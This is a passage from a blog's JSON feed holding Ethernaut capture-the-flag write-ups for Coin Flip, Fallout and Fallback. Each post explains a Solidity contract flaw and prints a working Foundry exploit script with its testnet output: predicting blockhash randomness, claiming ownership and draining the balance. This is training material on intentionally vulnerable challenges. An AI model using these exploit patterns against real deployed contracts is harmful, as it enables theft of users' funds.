class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">flip</span><span class=\"p\">(</span><span class=\"kt\">bool</span> <span class=\"n\">_guess</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"kt\">uint256</span> <span class=\"n\">blockValue</span> <span class=\"o\">=</span> <span class=\"kt\">uint256</span><span class=\"p\">(</span><span class=\"nb\">blockhash</span><span class=\"p\">(</span><span class=\"n\">block</span><span class=\"p\">.</span><span class=\"n\">number</span> <span class=\"o\">-</span> <span class=\"mi\">1</span><span class=\"p\">));</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">lastHash</span> <span class=\"o\">==</span> <span class=\"n\">blockValue</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"nb\">revert</span><span class=\"p\">();</span>        <span class=\"p\">}</span>        <span class=\"n\">lastHash</span> <span class=\"o\">=</span> <span class=\"n\">blockValue</span><span class=\"p\">;</span>        <span class=\"kt\">uint256</span> <span class=\"n\">coinFlip</span> <span class=\"o\">=</span> <span class=\"n\">blockValue</span> <span class=\"o\">/</span> <span class=\"n\">FACTOR</span><span class=\"p\">;</span>        <span class=\"kt\">bool</span> <span class=\"n\">side</span> <span class=\"o\">=</span> <span class=\"n\">coinFlip</span> <span class=\"o\">==</span> <span class=\"mi\">1</span> <span class=\"o\">?</span> <span class=\"nb\">true</span> <span class=\"o\">:</span> <span class=\"nb\">false</span><span class=\"p\">;</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">side</span> <span class=\"o\">==</span> <span class=\"n\">_guess</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"n\">consecutiveWins</span><span class=\"o\">++</span><span class=\"p\">;</span>            <span class=\"k\">return</span> <span class=\"nb\">true</span><span class=\"p\">;</span>        <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>            <span class=\"n\">consecutiveWins</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>            <span class=\"k\">return</span> <span class=\"nb\">false</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>Using to <code class=\"language-plaintext highlighter-rouge\">blackhash</code> value to generate random numbers.</p><p>Since this is accessible not only to the contract but also to external users, it becomes predictable.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/CoinFlip.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"kt\">uint256</span> <span class=\"k\">constant</span> <span class=\"n\">FACTOR</span> <span class=\"o\">=</span> <span class=\"mi\">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"n\">CoinFlip</span> <span class=\"n\">coinflip_</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"kt\">uint256</span> <span class=\"n\">blockValue</span> <span class=\"o\">=</span> <span class=\"kt\">uint256</span><span class=\"p\">(</span><span class=\"nb\">blockhash</span><span class=\"p\">(</span><span class=\"n\">block</span><span class=\"p\">.</span><span class=\"n\">number</span> <span class=\"o\">-</span> <span class=\"mi\">1</span><span class=\"p\">));</span>        <span class=\"kt\">uint256</span> <span class=\"n\">coinFlip</span> <span class=\"o\">=</span> <span class=\"n\">blockValue</span> <span class=\"o\">/</span> <span class=\"n\">FACTOR</span><span class=\"p\">;</span>        <span class=\"kt\">bool</span> <span class=\"n\">side</span> <span class=\"o\">=</span> <span class=\"n\">coinFlip</span> <span class=\"o\">==</span> <span class=\"mi\">1</span> <span class=\"o\">?</span> <span class=\"nb\">true</span> <span class=\"o\">:</span> <span class=\"nb\">false</span><span class=\"p\">;</span>        <span class=\"n\">coinflip_</span><span class=\"p\">.</span><span class=\"n\">flip</span><span class=\"p\">(</span><span class=\"n\">side</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">CoinFlipSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">CoinFlip</span> <span class=\"k\">public</span> <span class=\"n\">coinflip_</span> <span class=\"o\">=</span> <span class=\"n\">CoinFlip</span><span class=\"p\">(</span><span class=\"mh\">0x97Cf73B713944bD171aEd799FEDdED4BC5Fd3765</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">(</span><span class=\"n\">coinflip_</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Win counts: \"</span><span class=\"p\">,</span> <span class=\"n\">coinflip_</span><span class=\"p\">.</span><span class=\"n\">consecutiveWins</span><span class=\"p\">());</span>                <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>Looking at the problem code,</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">lastHash</span> <span class=\"o\">==</span> <span class=\"n\">blockValue</span><span class=\"p\">)</span> <span class=\"p\">{</span>    <span class=\"nb\">revert</span><span class=\"p\">();</span><span class=\"p\">}</span></code></pre></div></div><p>Since it reverts when <code class=\"language-plaintext highlighter-rouge\">lastHash</code> and <code class=\"language-plaintext highlighter-rouge\">blockValue</code> are the same, it‚Äôs impossible to execute repeatedly with a loop within the same contract.Therefore, I wrote it to be executed 10 times manually to solve the problem.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/CoinFlipSol.sol <span class=\"nt\">--tc</span> CoinFlipSol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  Win counts:  10<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.002187102 gweiEstimated total gas used <span class=\"k\">for </span>script: 123189Estimated amount required: 0.000000269426908278 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0x0a5c9241d43f66408948fff9f14bad881a6f1717557f05d693967085b33fc4c9Contract Address: 0x0BBe439AF9BC57d2358965e1d78B2831290038F9Block: 3672028Paid: 0.000000207251214534 ETH <span class=\"o\">(</span>94761 gas <span class=\"k\">*</span> 0.002187094 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000207251214534 ETH (94761 gas * avg 0.002187094 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-18-Coin_Flip/complete.png\" alt=\"Image complete\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-18-Coin_Flip/win.png\" alt=\"Image win\" /></p>",
            "url": "https://0o3q.github.io/2025/04/18/coin-flip",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-18T00:00:00+09:00",
            "date_modified": "2025-04-18T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/17/fallout",
            "title": "[Ethernaut] 02.Fallout",
            "summary": null,
            "content_text": "AnalysisThe goal is  Claim ownership of the contract below// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import \"openzeppelin-contracts-06/math/SafeMath.sol\";contract Fallout {    using SafeMath for uint256;    mapping(address =&gt; uint256) allocations;    address payable public owner;    /* constructor */    function Fal1out() public payable {        owner = msg.sender;        allocations[owner] = msg.value;    }    modifier onlyOwner() {        require(msg.sender == owner, \"caller is not the owner\");        _;    }    function allocate() public payable {        allocations[msg.sender] = allocations[msg.sender].add(msg.value);    }    function sendAllocation(address payable allocator) public {        require(allocations[allocator] &gt; 0);        allocator.transfer(allocations[allocator]);    }    function collectAllocations() public onlyOwner {        msg.sender.transfer(address(this).balance);    }    function allocatorBalance(address allocator) public view returns (uint256) {        return allocations[allocator];    }}Solidity 0.6.0 Documentation - constructors  üí° Prior to version 0.4.22, constructors were defined as functions with the same name as the contract. This syntax was deprecated and is not allowed anymore in version 0.5.0.For some reason, the intended constructor code was written as Fal1out(), preventing it from acting as a constructor and allowing external access, which enables claiming owner.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import \"../src/Fallout.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract FallbackSol is Script {    Fallout public fallout_ = Fallout(0x28eA66cBFb2900Bea8bb84f058d740ce0Ab751CB);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        fallout_.Fal1out();        console.log(\"Contract owner: \", fallout_.owner());        vm.stopBroadcast();    }}$ forge script script/FalloutSol.sol --broadcast[‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.== Logs ==  Contract owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.002095526 gweiEstimated total gas used for script: 62992Estimated amount required: 0.000000132001373792 ETH==========================##### holesky‚úÖ  [Success] Hash: 0xcaa845bc5fa9ebb3adcb5902c12ffa24c14a609adc31cd0b789bfae23b11c5aaBlock: 3669787Paid: 0.000000095568239514 ETH (45606 gas * 0.002095519 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000000095568239514 ETH (45606 gas * avg 0.002095519 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>Claim ownership of the contract below</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.6</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"openzeppelin-contracts-06/math/SafeMath.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Fallout</span> <span class=\"p\">{</span>    <span class=\"k\">using</span> <span class=\"n\">SafeMath</span> <span class=\"k\">for</span> <span class=\"kt\">uint256</span><span class=\"p\">;</span>    <span class=\"k\">mapping</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"o\">=&gt;</span> <span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"n\">allocations</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">payable</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"cm\">/* constructor */</span>    <span class=\"k\">function</span> <span class=\"n\">Fal1out</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"n\">allocations</span><span class=\"p\">[</span><span class=\"n\">owner</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">modifier</span> <span class=\"n\">onlyOwner</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">==</span> <span class=\"n\">owner</span><span class=\"p\">,</span> <span class=\"s\">\"caller is not the owner\"</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">allocate</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"n\">allocations</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">allocations</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">].</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">sendAllocation</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"k\">payable</span> <span class=\"n\">allocator</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">allocations</span><span class=\"p\">[</span><span class=\"n\">allocator</span><span class=\"p\">]</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span><span class=\"p\">);</span>        <span class=\"n\">allocator</span><span class=\"p\">.</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"n\">allocations</span><span class=\"p\">[</span><span class=\"n\">allocator</span><span class=\"p\">]);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">collectAllocations</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"n\">onlyOwner</span> <span class=\"p\">{</span>        <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">.</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">).</span><span class=\"nb\">balance</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">allocatorBalance</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">allocator</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">allocations</span><span class=\"p\">[</span><span class=\"n\">allocator</span><span class=\"p\">];</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p><a href=\"https://docs.soliditylang.org/en/v0.6.0/contracts.html#constructors\">Solidity 0.6.0 Documentation - constructors</a></p><blockquote>  <p>üí° Prior to version 0.4.22, constructors were defined as functions with the same name as the contract. This syntax was deprecated and is not allowed anymore in version 0.5.0.</p></blockquote><p>For some reason, the intended <code class=\"language-plaintext highlighter-rouge\">constructor</code> code was written as <code class=\"language-plaintext highlighter-rouge\">Fal1out()</code>, preventing it from acting as a <code class=\"language-plaintext highlighter-rouge\">constructor</code> and allowing external access, which enables claiming <code class=\"language-plaintext highlighter-rouge\">owner</code>.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.6</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Fallout.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">FallbackSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Fallout</span> <span class=\"k\">public</span> <span class=\"n\">fallout_</span> <span class=\"o\">=</span> <span class=\"n\">Fallout</span><span class=\"p\">(</span><span class=\"mh\">0x28eA66cBFb2900Bea8bb84f058d740ce0Ab751CB</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">fallout_</span><span class=\"p\">.</span><span class=\"n\">Fal1out</span><span class=\"p\">();</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Contract owner: \"</span><span class=\"p\">,</span> <span class=\"n\">fallout_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/FalloutSol.sol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  Contract owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.002095526 gweiEstimated total gas used <span class=\"k\">for </span>script: 62992Estimated amount required: 0.000000132001373792 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0xcaa845bc5fa9ebb3adcb5902c12ffa24c14a609adc31cd0b789bfae23b11c5aaBlock: 3669787Paid: 0.000000095568239514 ETH <span class=\"o\">(</span>45606 gas <span class=\"k\">*</span> 0.002095519 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000095568239514 ETH (45606 gas * avg 0.002095519 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-17-Fallback/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/17/fallout",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-17T00:00:00+09:00",
            "date_modified": "2025-04-17T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/17/fallback",
            "title": "[Ethernaut] 01.Fallback",
            "summary": null,
            "content_text": "AnalysisThe goals are  claim ownership of the contract  reduce its balance to 0// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Fallback {    mapping(address =&gt; uint256) public contributions;    address public owner;    constructor() {        owner = msg.sender;        contributions[msg.sender] = 1000 * (1 ether);    }    modifier onlyOwner() {        require(msg.sender == owner, \"caller is not the owner\");        _;    }    function contribute() public payable {        require(msg.value &lt; 0.001 ether);        contributions[msg.sender] += msg.value;        if (contributions[msg.sender] &gt; contributions[owner]) {            owner = msg.sender;        }    }    function getContribution() public view returns (uint256) {        return contributions[msg.sender];    }    function withdraw() public onlyOwner {        payable(owner).transfer(address(this).balance);    }    receive() external payable {        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);        owner = msg.sender;    }}To satisfy condition 2, go through the withdraw() function but access is impossible due to onlyOwner() modifier.However, looking receive() function, it seems that by increasingly the contribution value to more 0 through the contribute() function and sending more than 0 Ether to the contract, both conditions 1 and 2 could potentially be satisfied.Exploitsrc/Fallback.sol// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Fallback {    mapping(address =&gt; uint256) public contributions;    address public owner;    constructor() {        owner = msg.sender;        contributions[msg.sender] = 1000 * (1 ether);    }    modifier onlyOwner() {        require(msg.sender == owner, \"caller is not the owner\");        _;    }    function contribute() public payable {        require(msg.value &lt; 0.001 ether);        contributions[msg.sender] += msg.value;        if (contributions[msg.sender] &gt; contributions[owner]) {            owner = msg.sender;        }    }    function getContribution() public view returns (uint256) {        return contributions[msg.sender];    }    function withdraw() public onlyOwner {        payable(owner).transfer(address(this).balance);    }    receive() external payable {        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);        owner = msg.sender;    }}script/FallbackSol.sol// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/Fallback.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract FallbackSol is Script {    Fallback public fallback_ = Fallback(payable(0x0662008C4CEE1F808C3ca3800404a2BA704952eD));    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        fallback_.contribute{value: 1 wei}();        console.log(\"My contribution: \", fallback_.getContribution());        address(fallback_).call{value: 1 wei}(\"\");        console.log(\"Contract owner: \", fallback_.owner());        fallback_.withdraw();        vm.stopBroadcast();    }}$ forge script script/FallbackSol.sol --broadcast[‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.== Logs ==  My contribution:  1  Contract owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001963943 gweiEstimated total gas used for script: 147280Estimated amount required: 0.00000028924952504 ETH==========================##### holesky‚úÖ  [Success] Hash: 0xcfd1b8b30ecdf9dffb0d024643f3417b6235cfb1b11a8fef17c101be63223026Block: 3661559Paid: 0.000000055583316672 ETH (28302 gas * 0.001963936 gwei)##### holesky‚úÖ  [Success] Hash: 0xa47df7ac8010f0c6e1762a3f9931ff817346eaa3a92564633f8ff9e082de85d0Block: 3661559Paid: 0.00000009420019024 ETH (47965 gas * 0.001963936 gwei)##### holesky‚úÖ  [Success] Hash: 0x5995b55be2748fafb828eb0b58ec7ffbd2f1a49b82b970413feeb294851dca6aBlock: 3661559Paid: 0.000000059632952704 ETH (30364 gas * 0.001963936 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000000209416459616 ETH (106631 gas * avg 0.001963936 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goals are</p><ol>  <li>claim ownership of the contract</li>  <li>reduce its balance to 0</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Fallback</span> <span class=\"p\">{</span>    <span class=\"k\">mapping</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"o\">=&gt;</span> <span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">contributions</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"mi\">1000</span> <span class=\"o\">*</span> <span class=\"p\">(</span><span class=\"mi\">1</span> <span class=\"kc\">ether</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">modifier</span> <span class=\"n\">onlyOwner</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">==</span> <span class=\"n\">owner</span><span class=\"p\">,</span> <span class=\"s\">\"caller is not the owner\"</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">contribute</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span> <span class=\"o\">&lt;</span> <span class=\"mf\">0.001</span> <span class=\"kc\">ether</span><span class=\"p\">);</span>        <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">+=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">;</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">&gt;</span> <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">owner</span><span class=\"p\">])</span> <span class=\"p\">{</span>            <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">getContribution</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">];</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">withdraw</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"n\">onlyOwner</span> <span class=\"p\">{</span>        <span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"n\">owner</span><span class=\"p\">).</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">).</span><span class=\"nb\">balance</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">receive</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span><span class=\"p\">);</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>To satisfy condition 2, go through the <code class=\"language-plaintext highlighter-rouge\">withdraw()</code> function but access is impossible due to <code class=\"language-plaintext highlighter-rouge\">onlyOwner()</code> modifier.</p><p>However, looking <code class=\"language-plaintext highlighter-rouge\">receive()</code> function, it seems that by increasingly the <code class=\"language-plaintext highlighter-rouge\">contribution</code> value to more 0 through the <code class=\"language-plaintext highlighter-rouge\">contribute()</code> function and sending more than 0 Ether to the contract, both conditions 1 and 2 could potentially be satisfied.</p><h1 id=\"exploit\">Exploit</h1><hr /><p>src/Fallback.sol</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span 